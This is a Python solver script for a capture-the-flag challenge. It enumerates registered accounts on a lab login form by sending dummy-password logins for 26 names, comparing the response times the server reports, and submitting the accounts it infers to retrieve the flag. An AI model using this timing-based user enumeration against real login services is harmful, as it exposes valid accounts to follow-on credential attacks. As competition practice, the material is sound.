import os

import requests
from bs4 import BeautifulSoup


def enumarate_accounts():
    session = requests.Session()
    employees = [
        "Arthur", "Barbara", "Christine", "David", "Elbert", 
        "Franklin", "George", "Harris", "Ivan", "Jane", 
        "Kevin", "Lazarus", "Marc", "Nathan", "Oliver", 
        "Paul", "Quentin", "Randolph", "Scott", "Tony", 
        "Ulysses", "Vincent", "Wat", "Ximena", "Yvonne", "Zalmon"
    ]

    T = []
    for employee in employees:
        response = session.post(f"http://{os.getenv('CTF4B_HOST')}:{os.getenv('CTF4B_PORT')}", {"name": f"{employee}", "password": "x"})
        soup = BeautifulSoup(response.text, "html.parser")
        consume = float(soup.select('p')[0].text.split()[2])

        T.append((employee, consume))

    T.sort(key=lambda t: t[1], reverse=True)

    maxdiff = 0
    maxdiff_i = -1
    for i in range(1, len(T)):
        if abs(T[i][1] - T[i-1][1]) > maxdiff:
            maxdiff = abs(T[i][1] - T[i-1][1])
            maxdiff_i = i

    return sorted([employee for employee, consume in T[:maxdiff_i]])


def solve(accounts):
    response = requests.post(f"http://{os.getenv('CTF4B_HOST')}:{os.getenv('CTF4B_PORT')}/challenge", {"answer": accounts})
    soup = BeautifulSoup(response.text, "html.parser")
    print(f"[*] FLAG: {soup.select('#message')[0].text}")


def main():
    accounts = enumarate_accounts()
    print(f"[*] Registered accounts: {', '.join(accounts)}")
    solve(accounts)


if __name__ == '__main__':
    main()